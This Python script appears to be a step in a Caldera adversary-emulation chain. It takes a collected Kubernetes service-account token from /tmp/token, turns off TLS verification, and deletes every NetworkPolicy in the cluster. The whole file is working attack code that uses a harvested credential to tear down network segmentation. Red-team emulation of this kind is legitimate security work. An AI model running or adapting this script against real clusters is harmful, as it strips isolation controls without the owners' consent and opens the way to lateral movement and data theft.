#!/usr/bin/env python3
"""Remove Kubernetes NetworkPolicies when the collected token permits it.

Some target chains collect a service-account token that can list/delete network
policies; others only reach lower-privilege tokens.  Treat authorization blocks
as useful evidence by default instead of failing the whole Caldera operation.
Set ``NP_MODIFICATION_STRICT=true`` to restore fail-fast behavior.
"""

from __future__ import annotations

import json
import os
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any


def env_bool(name: str, default: bool = False) -> bool:
    raw = os.getenv(name)
    if raw is None or raw == "":
        return default
    return raw.lower() in {"1", "true", "yes", "on"}


def api_server(argv: list[str]) -> str:
    if argv and argv[0].strip():
        return argv[0].strip().rstrip("/")
    host = os.getenv("KUBERNETES_SERVICE_HOST")
    port = os.getenv("KUBERNETES_SERVICE_PORT")
    if host and port:
        return f"https://{host}:{port}"
    return "https://kubernetes.default.svc"


def request_json(url: str, token: str, *, method: str = "GET") -> tuple[int, Any]:
    request = urllib.request.Request(
        url,
        method=method,
        headers={
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
        },
    )
    context = ssl._create_unverified_context()  # noqa: SLF001 - lab self-signed certs.
    try:
        with urllib.request.urlopen(request, context=context, timeout=20) as response:
            body = response.read().decode("utf-8", errors="replace")
            return response.status, json.loads(body) if body else {}
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        try:
            payload = json.loads(body) if body else {}
        except json.JSONDecodeError:
            payload = {"body": body}
        return exc.code, payload


def main(argv: list[str]) -> int:
    strict = env_bool("NP_MODIFICATION_STRICT", False)
    token_path = Path(os.getenv("NP_TOKEN_FILE", "/tmp/token"))
    if not token_path.is_file() or token_path.stat().st_size == 0:
        print(f"No token at {token_path}; skipping NetworkPolicy modification.")
        return 1 if strict else 0

    token = token_path.read_text(encoding="utf-8", errors="ignore").strip()
    root = api_server(argv)
    list_url = f"{root}/apis/networking.k8s.io/v1/networkpolicies?limit=500"

    print("[*] Listing ALL NetworkPolicies cluster-wide...")
    status, payload = request_json(list_url, token)
    if status in {401, 403}:
        reason = payload.get("message") or payload.get("reason") or payload
        print(f"NetworkPolicy list blocked by API authorization ({status}): {reason}")
        return 1 if strict else 0
    if status >= 400:
        print(f"NetworkPolicy list returned HTTP {status}: {payload}")
        return 1 if strict else 0

    items = payload.get("items", []) if isinstance(payload, dict) else []
    if not items:
        print("No NetworkPolicies found. Nothing to do.")
        return 0

    failures = 0
    print(f"Found {len(items)} NetworkPolicies. Removing...")
    for item in items:
        metadata = item.get("metadata", {}) if isinstance(item, dict) else {}
        namespace = metadata.get("namespace")
        name = metadata.get("name")
        if not namespace or not name:
            continue
        path = (
            "/apis/networking.k8s.io/v1/namespaces/"
            f"{urllib.parse.quote(namespace)}/networkpolicies/{urllib.parse.quote(name)}"
        )
        status, delete_payload = request_json(f"{root}{path}", token, method="DELETE")
        if status in {200, 202, 404}:
            print(f" - {namespace}/{name}: OK")
        else:
            failures += 1
            print(f" - {namespace}/{name}: HTTP {status} {delete_payload}")

    if failures:
        print(f"Completed with {failures} delete failure(s).")
        return 1 if strict else 0
    print("Done.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
